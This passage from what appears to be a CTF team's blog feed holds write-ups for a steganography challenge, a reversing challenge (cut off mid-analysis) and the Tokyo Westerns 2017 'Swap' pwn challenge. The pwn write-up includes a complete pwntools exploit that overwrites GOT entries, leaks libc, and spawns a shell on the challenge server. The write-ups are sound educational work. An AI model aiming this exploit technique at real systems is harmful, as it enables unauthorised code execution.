<p>Stéganô is a python package for steganography which can be found here <a href="https://github.com/cedricbonhomme/Stegano" target="_blank" rel="external">https://github.com/cedricbonhomme/Stegano</a></p>
<p>Now using stegano to extract something from png, there was two binaries in stegano we tried with stegano-lsb but it didn’t work so we tried with stegano-lsb-set with the generator triangular_numbers:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ Stegano/bin/stegano-lsb-set reveal -i e07d17ed7d8104590ff3e17bdf052057.png -g triangular_numbers</div><div class="line">ASIS&#123;767ba85340d9e49fa0bb9c2b12037f08&#125;</div></pre></td></tr></table></figure>
<p>And we got the flag!</p>
]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;&lt;br&gt; ASIS secret letter&lt;br&gt;&lt;br&gt;Average: 4.17&lt;br&gt;Rating Count: 6&lt;br&gt;You Rated: 5&lt;br&gt;Top 3 Solver&lt;br&gt;&lt;br&gt;    Teamrocketist&lt;br&gt;    
    
    </summary>
    
      <category term="Stego" scheme="https://teamrocketist.github.io/categories/Stego/"/>
    
    
      <category term="forensics" scheme="https://teamrocketist.github.io/tags/forensics/"/>
    
      <category term="stego" scheme="https://teamrocketist.github.io/tags/stego/"/>
    
      <category term="stegano" scheme="https://teamrocketist.github.io/tags/stegano/"/>
    
      <category term="binwalk" scheme="https://teamrocketist.github.io/tags/binwalk/"/>
    
  </entry>
  
  <entry>
    <title>[Pwn] Tokyo Westerns CTF 3rd 2017 - Swap</title>
    <link href="https://teamrocketist.github.io/2017/09/07/Pwn-Tokyo-Westerns-CTF-3rd-2017-Swap/"/>
    <id>https://teamrocketist.github.io/2017/09/07/Pwn-Tokyo-Westerns-CTF-3rd-2017-Swap/</id>
    <published>2017-09-07T02:47:20.000Z</published>
    <updated>2017-09-07T04:52:15.777Z</updated>
    
    <content type="html"><![CDATA[<blockquote><br>The swapping is interesting. Let’s try!<br><br>nc pwn1.chal.ctf.westerns.tokyo 19937<br>swap<br>libc.so.6<br></blockquote>

<p>We are given an 64 bit ELF for Linux x86-64:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ file swap</div><div class="line">swap: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span class="keyword">for</span> GNU/Linux 2.6.32, BuildID[sha1]=74448e9fb5920898de1f9b5115c764eff1c8edac, not stripped</div></pre></td></tr></table></figure>
<p>We decompile it using ida’s pseudo c converter:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">int</span> __cdecl __<span class="function">noreturn <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">  <span class="keyword">int</span> v3; <span class="comment">// eax@2</span></div><div class="line">  <span class="keyword">void</span> *src; <span class="comment">// [sp+20h] [bp-20h]@0</span></div><div class="line">  <span class="keyword">void</span> *v5; <span class="comment">// [sp+28h] [bp-18h]@0</span></div><div class="line">  <span class="keyword">char</span> dest; <span class="comment">// [sp+30h] [bp-10h]@7</span></div><div class="line"></div><div class="line">  initialize();</div><div class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</div><div class="line">  &#123;</div><div class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</div><div class="line">    &#123;</div><div class="line">      print_menu();</div><div class="line">      v3 = read_int();</div><div class="line">      <span class="keyword">if</span> ( v3 != <span class="number">1</span> )</div><div class="line">        <span class="keyword">break</span>;</div><div class="line">      <span class="built_in">puts</span>(<span class="string">"Please input 1st addr"</span>);</div><div class="line">      src = (<span class="keyword">void</span> *)read_ll();</div><div class="line">      <span class="built_in">puts</span>(<span class="string">"Please input 2nd addr"</span>);</div><div class="line">      v5 = (<span class="keyword">void</span> *)read_ll();</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> ( v3 == <span class="number">2</span> )</div><div class="line">    &#123;</div><div class="line">      <span class="built_in">memcpy</span>(&amp;dest, src, <span class="number">8u</span>LL);</div><div class="line">      <span class="built_in">memcpy</span>(src, v5, <span class="number">8u</span>LL);</div><div class="line">      <span class="built_in">memcpy</span>(v5, &amp;dest, <span class="number">8u</span>LL);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( !v3 )</div><div class="line">    &#123;</div><div class="line">      <span class="built_in">puts</span>(<span class="string">"Bye."</span>);</div><div class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">__<span class="function">int64 <span class="title">read_int</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">  __int64 result; <span class="comment">// rax@1</span></div><div class="line">  <span class="keyword">char</span> buf; <span class="comment">// [sp+10h] [bp-90h]@1</span></div><div class="line"></div><div class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x10</span>uLL);</div><div class="line">  result = atoi(&amp;buf);</div><div class="line"></div><div class="line">  <span class="keyword">return</span> result;</div><div class="line">&#125;</div><div class="line">__<span class="function">int64 <span class="title">read_ll</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">  __int64 result; <span class="comment">// rax@1</span></div><div class="line">  <span class="keyword">char</span> buf; <span class="comment">// [sp+10h] [bp-110h]@1</span></div><div class="line"></div><div class="line"></div><div class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x20</span>uLL);</div><div class="line">  result = atoll(&amp;buf);</div><div class="line">  <span class="keyword">return</span> result;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>Resuming what the program is actually doing:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">Option 1 - Choose two addresses</div><div class="line">Option 2 - Swap 2 addresses previously chosen (can be used to switch <span class="keyword">function</span> addresses <span class="keyword">for</span> example)</div><div class="line">Option 3 - Prints <span class="built_in">bye</span> and exits</div></pre></td></tr></table></figure>
<p>The first thing we can start doing is to get the GOT(Global Offset Table) addresses of the functions we need, we can do this in 3 ways:<br>objdump</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ objdump -R swap</div></pre></td></tr></table></figure>
<p>readelf</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ readelf -r swap</div></pre></td></tr></table></figure>
<p>pwntools</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">binary = ELF ( <span class="string">'./swap'</span> )</div><div class="line">ATOIGOT = binary.got[<span class="string">'atoi'</span>]</div><div class="line">PUTSGOT =  binary.got[<span class="string">'puts'</span>]</div><div class="line">READGOT =  binary.got[<span class="string">'read'</span>]</div><div class="line">MEMCOPYGOT = binary.got[<span class="string">'memcpy'</span>]</div></pre></td></tr></table></figure>
<p>To get the PLT addresses we can either use objdump or pwntools again<br>objdump</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">objdump -dj.plt swap</div></pre></td></tr></table></figure>
<p>pwntools</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">binary = ELF ( <span class="string">'./swap'</span> )</div><div class="line">PUTSPLT =  binary.plt[<span class="string">'puts'</span>]</div></pre></td></tr></table></figure>
<p>Now making a nice function to swap addresses in python : </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">swap</span><span class="params">(address1, address2)</span>:</span></div><div class="line">  <span class="keyword">print</span> r.recvuntil(<span class="string">'Your choice: \n'</span>)</div><div class="line">  send(<span class="string">'1'</span>)</div><div class="line"></div><div class="line">  <span class="keyword">print</span> r.recvuntil(<span class="string">'Please input 1st addr'</span>)</div><div class="line">  send(str(address1))</div><div class="line">  <span class="keyword">print</span> r.recvuntil(<span class="string">'Please input 2nd addr'</span>)</div><div class="line">  send(str(address2))</div><div class="line">  <span class="keyword">print</span> r.recvuntil(<span class="string">'Your choice: \n'</span>)</div><div class="line">  send(<span class="string">'2'</span>)</div></pre></td></tr></table></figure>
<p>We can start by thinking into changing <code>memcpy_got</code> and read_got addresses, and why? because with this when we choose the option 2 to swap we will have something like this:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">read(&amp;dest, address1, <span class="number">8u</span>LL);</div><div class="line">read(address1, address2, <span class="number">8u</span>LL);</div><div class="line">read(address2, &amp;dest, <span class="number">8u</span>LL);</div></pre></td></tr></table></figure>
<p>The second read is what is interesting to us, we can controll the first two arguments to our advantage, if we choose the 1st address to be the file descriptor 0(<code>STDIN</code>) and the 2nd address the function we want to overwrite.   </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">read(<span class="number">0</span>, ATOI_GOT, <span class="number">0x8</span>); <span class="comment">// example: 1st arg: 0, 2nd arg: ATOI_GOT</span></div></pre></td></tr></table></figure>
<p>The next thing to do is to overwrite <code>atoi</code> function and why we want to do it? Because if we overwrite <code>atoi</code> into <code>puts_plt</code> we can leak addresses easily, because we first read them and then print them!</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">read(<span class="number">0</span>, &amp;buf, <span class="number">0x10</span>uLL);</div><div class="line">result = <span class="built_in">puts</span>(&amp;buf);</div></pre></td></tr></table></figure>
<p>Now that we overwrite <code>atoi</code> with <code>puts</code> we can start trying to leak libc addresses like this:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">print</span> r.recvuntil(<span class="string">'choice: \n'</span>)</div><div class="line">r.send(<span class="string">"B"</span>)</div><div class="line">h = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>)) <span class="comment"># ljust will convert an address like 0x7f3253354340 into 0x0007f3253354340</span></div><div class="line"><span class="keyword">print</span> <span class="string">"STACK ADDRESS 0x%x"</span>%h</div></pre></td></tr></table></figure>
<p>Now we got a stack address but it’s still not the address we need, we have to calculate the offset of this address to the libcbase address! we can calculate this with help of gdb. Just run your python script (there will be a sleep of 5 seconds and attach the PID address on gdb like this:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">pwndbg&gt; attach 6865</div><div class="line">...outputfrompwngdb...</div><div class="line">pwndbg&gt; <span class="built_in">continue</span></div><div class="line">pwndbg&gt; p system</div><div class="line"><span class="variable">$1</span> = &#123;&lt;text variable, no debug info&gt;&#125; 0x7fcb77dea391 &lt;system&gt;</div><div class="line"></div><div class="line">---------------runing-program-in-another-terminal---------------</div><div class="line">$ python swap.py</div><div class="line">..hidden-output...</div><div class="line">1. Set addrsses</div><div class="line">2. Swap both addrress of value</div><div class="line">0. Exit</div><div class="line">Your choice: </div><div class="line"></div><div class="line">STACK ADDRESS 0x7fcb7816a642</div></pre></td></tr></table></figure>
<p>Now if we subtract the leaked address from the system address we got from gdb we will get and offset to system function:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ python -c <span class="string">"print hex(0x7fcb7816a642 - 0x7fcb77dea391)"</span></div><div class="line"><span class="number">0x3802b1</span></div></pre></td></tr></table></figure>
<p>Adapting the python script:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">h = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</div><div class="line"><span class="keyword">print</span> <span class="string">"STACK ADDRESS 0x%x"</span>%h</div><div class="line">addr = h<span class="number">-0x3802b1</span>- libc.symbols[<span class="string">'system'</span>]</div><div class="line">LIBCBASE = addr</div><div class="line">SYSTEM = LIBCBASE + libc.symbols[<span class="string">'system'</span>]</div><div class="line"><span class="comment">#print r.recv(1024)</span></div><div class="line"></div><div class="line">log.info(<span class="string">"LIBC 0x%x"</span> % LIBCBASE)</div><div class="line">log.info(<span class="string">"SYSTEM 0x%x"</span> % SYSTEM)</div></pre></td></tr></table></figure>
<p>We still have a small problem from now on, now that we overwrite the atoi we can’t really choose which option from the menu, well we actually can! puts returns the number of bytes printed! the null byte is included in this count! </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">int i = puts(&apos;\x00&apos;) // returns 1</div><div class="line">int i = puts(&apos;B\x00&apos;) // returns 2</div></pre></td></tr></table></figure>
<p>Now we give the input ‘B\x00’ into puts so it will return the value 2! and we overwrite the atoi-&gt;puts-&gt;system and sent the “/bin/sh\x00” string to get ourselves a shell!:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">r.send(<span class="string">'a\x00'</span>) <span class="comment"># returns option 2 from puts</span></div><div class="line"></div><div class="line"><span class="keyword">print</span> r.recvuntil(<span class="string">'choice: \n'</span>)</div><div class="line">r.send(p64(SYSTEM)) <span class="comment"># overwrites atoi -&gt; puts -&gt; system</span></div><div class="line"></div><div class="line"><span class="keyword">print</span> r.recvuntil(<span class="string">'choice: \n'</span>)</div><div class="line">r.send(<span class="string">'/bin/sh\x00'</span>) <span class="comment"># passes argument /bin/sh into system</span></div></pre></td></tr></table></figure>
<p>The full script is:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"><span class="keyword">from</span> pwnlib.tubes <span class="keyword">import</span> *</div><div class="line"><span class="keyword">from</span> pwnlib.util.packing <span class="keyword">import</span> *</div><div class="line"><span class="keyword">from</span> pwnlib.tubes.process <span class="keyword">import</span> *</div><div class="line"><span class="keyword">from</span> pwnlib.tubes.remote <span class="keyword">import</span> *</div><div class="line"></div><div class="line"><span class="keyword">import</span> struct</div><div class="line"><span class="keyword">import</span> time</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getConn</span><span class="params">(local)</span>:</span></div><div class="line">    <span class="keyword">return</span> process(<span class="string">'./swap'</span>, env = &#123;<span class="string">"LD_PRELOAD"</span>:<span class="string">"./libc.so.6"</span>&#125;) <span class="keyword">if</span> local <span class="keyword">else</span> remote(<span class="string">'pwn1.chal.ctf.westerns.tokyo'</span>, <span class="number">19937</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">send</span><span class="params">(s)</span>:</span></div><div class="line">	<span class="keyword">print</span> s</div><div class="line">	r.sendline(s)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">swap</span><span class="params">(address1, address2)</span>:</span></div><div class="line">	<span class="keyword">print</span> r.recvuntil(<span class="string">'Your choice: \n'</span>)</div><div class="line">	send(<span class="string">'1'</span>)</div><div class="line"></div><div class="line">	<span class="keyword">print</span> r.recvuntil(<span class="string">'Please input 1st addr'</span>)</div><div class="line">	send(str(address1))</div><div class="line">	<span class="keyword">print</span> r.recvuntil(<span class="string">'Please input 2nd addr'</span>)</div><div class="line">	send(str(address2))</div><div class="line"></div><div class="line">	<span class="keyword">print</span> r.recvuntil(<span class="string">'Your choice: \n'</span>)</div><div class="line">	send(<span class="string">'2'</span>)</div><div class="line"></div><div class="line"></div><div class="line">local = <span class="keyword">False</span></div><div class="line">binary = ELF ( <span class="string">'./swap'</span> )</div><div class="line">libc = ELF(<span class="string">'./libc.so.6'</span>)</div><div class="line"></div><div class="line">PUTSPLT = binary.plt[<span class="string">'puts'</span>]</div><div class="line">ATOIGOT = binary.got[<span class="string">'atoi'</span>]</div><div class="line">PUTSGOT =  binary.got[<span class="string">'puts'</span>]</div><div class="line">READGOT =  binary.got[<span class="string">'read'</span>]</div><div class="line">MEMCOPYGOT = binary.got[<span class="string">'memcpy'</span>]</div><div class="line"></div><div class="line">r = getConn(local)</div><div class="line">swap(MEMCOPYGOT,READGOT)</div><div class="line">swap(<span class="number">0</span>,ATOIGOT)</div><div class="line">r.send(p64(PUTSPLT))</div><div class="line"><span class="keyword">print</span> r.recvuntil(<span class="string">'choice: \n'</span>)</div><div class="line"></div><div class="line">r.send(<span class="string">"B"</span>)</div><div class="line"></div><div class="line">h = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</div><div class="line"><span class="keyword">print</span> <span class="string">"STACK ADDRESS 0x%x"</span>%h</div><div class="line">addr = h<span class="number">-0x3802b1</span>- libc.symbols[<span class="string">'system'</span>]</div><div class="line">LIBCBASE = addr</div><div class="line">SYSTEM = LIBCBASE + libc.symbols[<span class="string">'system'</span>]</div><div class="line"><span class="comment">#print r.recv(1024)</span></div><div class="line"></div><div class="line">log.info(<span class="string">"LIBC 0x%x"</span> % LIBCBASE)</div><div class="line">log.info(<span class="string">"SYSTEM 0x%x"</span> % SYSTEM)</div><div class="line">r.send(<span class="string">'a\x00'</span>)</div><div class="line"></div><div class="line"><span class="keyword">print</span> r.recvuntil(<span class="string">'choice: \n'</span>)</div><div class="line">r.send(p64(SYSTEM))</div><div class="line"></div><div class="line"><span class="keyword">print</span> r.recvuntil(<span class="string">'choice: \n'</span>)</div><div class="line">r.send(<span class="string">'/bin/sh\x00'</span>)</div><div class="line"></div><div class="line">r.interactive()</div><div class="line">r.close()</div></pre></td></tr></table></figure>
<p>Running it</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">$ python swap.py</div><div class="line">[*] <span class="string">'~/swap'</span></div><div class="line">    Arch:     amd64-64-little</div><div class="line">    RELRO:    Partial RELRO</div><div class="line">    Stack:    Canary found</div><div class="line">    NX:       NX enabled</div><div class="line">    PIE:      No PIE (0x400000)</div><div class="line">[*] <span class="string">'~/libc.so.6'</span></div><div class="line">    Arch:     amd64-64-little</div><div class="line">    RELRO:    Partial RELRO</div><div class="line">    Stack:    Canary found</div><div class="line">    NX:       NX enabled</div><div class="line">    PIE:      PIE enabled</div><div class="line">...hidden-output...</div><div class="line">STACK ADDRESS 0x7fe5d8827642</div><div class="line">[*] LIBC 0x7fe5d8462001</div><div class="line">[*] SYSTEM 0x7fe5d84a7391</div><div class="line">...hidden-output...</div><div class="line">$ cat flag</div><div class="line">TWCTF&#123;SWAP_SAWP_WASP_PWAS_SWPA&#125;</div></pre></td></tr></table></figure>
<p>I didn’t solve this challenge in the CTF tournament I actually read this write ups(<a href="https://ctftime.org/writeup/7387" target="_blank" rel="external">https://ctftime.org/writeup/7387</a> and <a href="https://github.com/sk4px/CTFs/blob/master/tw2017/swap.py" target="_blank" rel="external">https://github.com/sk4px/CTFs/blob/master/tw2017/swap.py</a>) and did the challenge by myself after that.</p>
]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;&lt;br&gt;The swapping is interesting. Let’s try!&lt;br&gt;&lt;br&gt;nc pwn1.chal.ctf.westerns.tokyo 19937&lt;br&gt;swap&lt;br&gt;libc.so.6&lt;br&gt;&lt;/blockquote&gt;


    
    </summary>
    
      <category term="Pwn" scheme="https://teamrocketist.github.io/categories/Pwn/"/>
    
    
      <category term="pwn" scheme="https://teamrocketist.github.io/tags/pwn/"/>
    
      <category term="swapaddresses" scheme="https://teamrocketist.github.io/tags/swapaddresses/"/>
    
  </entry>
  
  <entry>
    <title>[Reverse] Tokyo Westerns CTF 3rd 2017 - Rev Rev Rev</title>
    <link href="https://teamrocketist.github.io/2017/09/04/Reverse-Tokyo-Westerns-CTF-3rd-2017-Rev-Rev-Rev/"/>
    <id>https://teamrocketist.github.io/2017/09/04/Reverse-Tokyo-Westerns-CTF-3rd-2017-Rev-Rev-Rev/</id>
    <published>2017-09-04T01:25:49.000Z</published>
    <updated>2017-09-04T18:14:47.808Z</updated>
    
    <content type="html"><![CDATA[<blockquote><br> Rev Rev Rev<br>Problem<br><br><a href="/content/files/tokyo-westerns-3rd-2007/rev_rev_rev">rev_rev_rev</a><br></blockquote>

<p>Lets first disassemble the main function of the binary:</p>
<p><a href="https://i.imgur.com/oe6q5SE.png" target="_blank" rel="external"> <img src="https://i.imgur.com/oe6q5SE.png" alt="main disas"> </a></p>
<p>Ignoring the <code>MK_FP</code> function which is related to the stack canaries protection on the executable we can see the program is reading from the <code>STDIN</code> into <code> s </code> and then modifies 4 modifications on the string using 4 functions:  </p>
<p><code><br>sub_80486B9(&amp;s);<br>sub_80486DB(&amp;s);<br>sub_8048738(&amp;s);<br>sub_80487B2(&amp;s);<br></code></p>
<p>Sub_80486B9 is just removing the new line in the end of the string by inserting a nullbyte on it (note that 10 or 0x0A in hex represents the \n):</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">char</span> *__<span class="function">cdecl <span class="title">sub_80486B9</span><span class="params">(<span class="keyword">char</span> *s)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">  <span class="keyword">char</span> *result; <span class="comment">// eax@1</span></div><div class="line"></div><div class="line">  result = <span class="built_in">strchr</span>(s, <span class="number">10</span>);</div><div class="line">  *result = <span class="number">0</span>;</div><div class="line">  <span class="keyword">return</span> result;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>sub_80486DB is just reversing the string:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">char</span> *__<span class="function">cdecl <span class="title">sub_80486DB</span><span class="params">(<span class="keyword">char</span> *s)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">  <span class="keyword">char</span> v1; <span class="comment">// ST17_1@2</span></div><div class="line">  <span class="keyword">char</span> *result; <span class="comment">// eax@3</span></div><div class="line">  <span class="keyword">char</span> *v3; <span class="comment">// [sp+8h] [bp-10h]@1</span></div><div class="line">  <span class="keyword">char</span> *i; <span class="comment">// [sp+Ch] [bp-Ch]@1</span></div><div class="line"></div><div class="line">  v3 = s;</div><div class="line">  <span class="keyword">for</span> ( i = &amp;s[<span class="built_in">strlen</span>(s) - <span class="number">1</span>]; ; --i )</div><div class="line">  &#123;</div><div class="line">    result = v3;</div><div class="line">    <span class="keyword">if</span> ( v3 &gt;= i )</div><div class="line">      <span class="keyword">break</span>;</div><div class="line">    v1 = *v3;</div><div class="line">    *v3 = *i;</div><div class="line">    *i = v1;</div><div class="line">    ++v3;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">return</span> result;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>sub_8048738 is performing a bunch of operation on the characters of the string some AND, OR and shifts</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">sub_8048738</span><span class="params">(<span class="keyword">char</span> *a1)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">  <span class="keyword">char</span> v1; <span class="comment">// ST0B_1@2</span></div><div class="line">  <span class="keyword">unsigned</span> __int8 v2; <span class="comment">// ST0B_1@2</span></div><div class="line">  <span class="keyword">int</span> result; <span class="comment">// eax@3</span></div><div class="line">  <span class="keyword">char</span> *i; <span class="comment">// [sp+Ch] [bp-4h]@1</span></div><div class="line"></div><div class="line">  <span class="keyword">for</span> ( i = a1; ; ++i )</div><div class="line">  &#123;</div><div class="line">    result = (<span class="keyword">unsigned</span> __int8)*i;</div><div class="line">    <span class="keyword">if</span> ( !(_BYTE)result )</div><div class="line">      <span class="keyword">break</span>;</div><div class="line">    v1 = <span class="number">2</span> * (*i &amp; <span class="number">0x55</span>) | (*i &gt;&gt; <span class="number">1</span>) &amp; <span class="number">0x55</span>;</div><div class="line">    v2 = <span class="number">4</span> * (v1 &amp; <span class="number">0x33</span>) | (v1 &gt;&gt; <span class="number">2</span>) &amp; <span class="number">0x33</span>;</div><div class="line">    *i = <span class="number">16</span> * v2 | (v2 &gt;&gt; <span class="number">4</span>);</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">return</span> result;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>sub_80487B2 is flipping the bits of each byte using ~ operator</p>
